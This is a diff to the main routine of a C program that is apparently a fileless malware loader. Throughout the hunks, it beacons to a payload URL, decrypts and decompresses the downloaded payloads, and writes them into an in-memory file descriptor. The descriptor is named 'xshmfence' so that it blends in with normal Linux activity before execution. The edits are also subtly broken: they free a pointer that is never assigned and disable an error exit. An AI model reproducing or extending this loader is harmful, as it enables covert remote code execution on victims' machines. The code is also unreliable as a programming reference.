@@ -24,14 +24,20 @@ int main(int argc, char **argv)
     unsigned char *psswd;
     int numFiles = 0;
     char currFileName[strlen(PATH_TO_WRITE) + 5];
-
+    char *formattedURL;
+    /*
+    formattedURL = formatURL(PAYLOAD_URL);
+    if (formattedURL == NULL)
+        return -1;
+    */
     payload = beacon(PAYLOAD_URL);
     payloadOffset = payload.memory; // hold for iteration
     numPayloads = extractInt(payloadOffset);
 
     payloadMeta = parseMeta(&payloadOffset); // extract all metadata
     if(payloadMeta == NULL){
-        //free everything
+        free(payload.memory);
+        free(formattedURL);
         return -1;
     }
 
@@ -42,6 +48,7 @@ int main(int argc, char **argv)
     {
         free(payload.memory);
         free(payloadMeta);
+        free(formattedURL);
         return -1;
     }
 
@@ -54,6 +61,7 @@ int main(int argc, char **argv)
             free(decrypted);
             free(payload.memory);
             free(payloadMeta);
+            free(formattedURL);
             return -1;
         }
 
@@ -62,7 +70,7 @@ int main(int argc, char **argv)
         while ((payloadFD = memfd_create("xshmfence", 0)) <= 2) // name as such due to this fd name appearing often on linux
         {                                                       // create memory file descriptor for execution
             close(payloadFD);
-            return -1;
+            //return -1;
         }
 
         writeReturnSize = write(payloadFD, decompressed, payloadMeta[i].uncompressedLength); // write to mem_fd and error check
@@ -73,6 +81,7 @@ int main(int argc, char **argv)
             free(payloadMeta);
             free(psswd);
             close(payloadFD);
+            free(formattedURL);
             return -1;
         }
 
@@ -90,6 +99,7 @@ int main(int argc, char **argv)
                     free(payloadMeta);
                     free(psswd);
                     close(payloadFD);
+                    free(formattedURL);
                     return -1;
                 }
             }
@@ -110,5 +120,6 @@ int main(int argc, char **argv)
     free(payload.memory);
     free(payloadMeta);
     free(psswd);
+    free(formattedURL);
     return 0;
 }
